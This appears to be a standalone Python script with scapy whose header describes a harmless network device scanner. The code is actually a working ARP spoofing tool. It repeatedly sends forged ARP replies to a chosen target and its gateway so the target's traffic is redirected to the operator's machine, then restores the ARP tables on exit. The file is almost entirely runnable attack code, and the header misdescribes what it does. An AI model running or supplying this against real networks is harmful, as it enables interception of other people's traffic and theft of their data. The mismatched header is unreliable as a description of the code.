#!/usr/bin/env python3
# 🌐 Network Device Scanner
# 🛡️ Author: Master Anon (https://github.com/Anonymoussxb)
# 📅 Date: 2025-05-26
# 📝 Description: This script scans for devices on a given subnet/IP range 
#     and displays active IP and MAC addresses in a table.
# 📦 Dependencies: scapy, prettytable
# ⚠️ Note: Works best on Linux with sudo privileges. Designed for internal network enumeration.


import time, argparse, scapy.all as scapy

def get_arguments():
    '''🎯 Get user inputs (Target and Gateway IP) from command line'''
    parser = argparse.ArgumentParser(description="🛠️ 𝗔𝗥𝗣 𝗦𝗽𝗼𝗼𝗳𝗶𝗻𝗴 𝗧𝗼𝗼𝗹 - Redirect target’s traffic to your machine.")
    parser.add_argument("-t", "--target", dest="t_ip", help="🎯 𝙋𝙪𝙩 𝙩𝙝𝙚 𝙏𝙖𝙧𝙜𝙚𝙩 𝙄𝙋")
    parser.add_argument("-g", "--gateway", dest="g_ip", help="🌐 𝙋𝙪𝙩 𝙩𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙄𝙋")
    return parser.parse_args()

def get_mac(ip):
    '''🔍 Scan the network and return MAC address of any IP'''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

def spoof(target_ip, spoof_ip):
    '''🎭 Send ARP reply packets to spoof IP addresses'''
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
       
        scapy.send(packet, verbose=False)
    else:
        print(f"⚠️  Could not resolve MAC for {target_ip}")

def restore(destination_ip, source_ip):
    '''🛠️ Restore the original ARP table to avoid breaking the network'''
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                           psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
        print(f"🔧 Restored ARP table for {destination_ip}")
    else:
        print(f"❌ Failed to restore ARP for {destination_ip} or {source_ip}")

def run_arpspoof():
    '''🎬 Starts the ARP spoofing process and handles Ctrl+C to restore'''
    options = get_arguments()
    print("\n🚨 Starting ARP Spoofing... Press Ctrl+C to stop and restore.")
    time.sleep(1)
    try:
        packet_count = 0
        while True:
            spoof(options.t_ip, options.g_ip)
            spoof(options.g_ip, options.t_ip)
            packet_count += 2
            print(f"📦 Sent: {packet_count} packets", end="\r")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n🧹 Ctrl+C detected! Cleaning up ARP tables...")
        restore(options.t_ip, options.g_ip)
        restore(options.g_ip, options.t_ip)
        print("✅ ARP tables restored. Exiting gracefully!\n")

run_arpspoof()
